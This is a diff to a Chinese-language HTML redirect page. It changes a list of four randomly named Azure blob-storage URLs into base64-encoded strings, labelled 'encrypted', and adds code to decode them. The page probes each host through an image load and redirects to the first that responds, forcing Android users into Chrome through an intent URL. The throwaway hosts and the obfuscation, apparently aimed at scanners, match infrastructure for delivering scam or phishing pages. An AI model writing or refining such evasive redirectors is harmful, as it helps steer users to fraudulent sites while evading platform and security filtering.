@@ -7,41 +7,34 @@
   <style>
     html, body {
       margin: 0;
-      background: #f9f9f9;
+      background: #f4f4f4;
       font-family: sans-serif;
       display: flex;
       justify-content: center;
       align-items: center;
       height: 100vh;
-      color: #555;
+      color: #333;
     }
     .message {
       text-align: center;
       display: none;
     }
-    .loading {
-      font-size: 18px;
-    }
     .fail {
-      color: #d00;
+      color: #c00;
     }
   </style>
 </head>
 <body>
-  <div class="message" id="loadingMsg">
-    <div class="loading">正在跳转，请稍候...</div>
-  </div>
-
-  <div class="message fail" id="failMsg">
-    <div>项目维护中，请稍后再试。</div>
-  </div>
+  <div class="message" id="loadingMsg">正在跳转，请稍候...</div>
+  <div class="message fail" id="failMsg">项目维护中，请稍后再试。</div>
 
   <script>
-    const urls = [
-      "https://iwtq25dhr.blob.core.windows.net/home/index.html",
-      "https://fx4iug5qsp.blob.core.windows.net/home/index.html",
-      "https://hjdkc8731miw.blob.core.windows.net/home/index.html",
-      "https://x93yv2cak5w8.z48.web.core.windows.net/home/index.html"
+    // base64 编码的 URL 列表（加密）
+    const encodedUrls = [
+      "aHR0cHM6Ly9pd3RxMjVkaHIuYmxvYi5jb3JlLndpbmRvd3MubmV0L2hvbWUvaW5kZXguaHRtbA==",
+      "aHR0cHM6Ly9meDRpdWc1cXNwLmJsb2IuY29yZS53aW5kb3dzLm5ldC9ob21lL2luZGV4Lmh0bWw=",
+      "aHR0cHM6Ly9oamRrYzg3MzFtaXcuYmxvYi5jb3JlLndpbmRvd3MubmV0L2hvbWUvaW5kZXguaHRtbA==",
+      "aHR0cHM6Ly94OTN5djJjYWs1dzguejQ4LndlYi5jb3JlLndpbmRvd3MubmV0L2hvbWUvaW5kZXguaHRtbA=="
     ];
 
     const isAndroid = /android/i.test(navigator.userAgent);
@@ -50,37 +43,43 @@
 
     loadingMsg.style.display = "block";
 
-    let loaded = false;
+    let redirected = false;
 
-    function testUrl(urlIndex) {
-      if (urlIndex >= urls.length) {
+    function base64Decode(str) {
+      try {
+        return atob(str);
+      } catch (e) {
+        return null;
+      }
+    }
+
+    function tryNext(index) {
+      if (index >= encodedUrls.length) {
         loadingMsg.style.display = "none";
         failMsg.style.display = "block";
         return;
       }
 
-      const img = new Image();
-      const url = urls[urlIndex];
-      img.onload = () => {
-        if (loaded) return;
-        loaded = true;
+      const url = base64Decode(encodedUrls[index]);
+      if (!url) return tryNext(index + 1);
 
-        // ✅ Android 强制使用 Chrome 打开外部链接
+      const img = new Image();
+      img.onload = () => {
+        if (redirected) return;
+        redirected = true;
+
         if (isAndroid) {
-          window.location.href =
-            `intent://${url.replace(/^https?:\/\//, "")}#Intent;scheme=https;package=com.android.chrome;end`;
+          // Android 强制跳转 Chrome 浏览器
+          window.location.href = `intent://${url.replace(/^https?:\/\//, "")}#Intent;scheme=https;package=com.android.chrome;end`;
         } else {
           window.location.href = url;
         }
       };
-      img.onerror = () => testUrl(urlIndex + 1);
-
-      // 触发加载
-      img.src = url + "?t=" + Date.now();
+      img.onerror = () => tryNext(index + 1);
+      img.src = url + "?ping=" + Date.now();
     }
 
-    // 延迟一点点再开始测试，以防白屏
-    setTimeout(() => testUrl(0), 300);
+    setTimeout(() => tryNext(0), 300);
   </script>
 </body>
 </html>
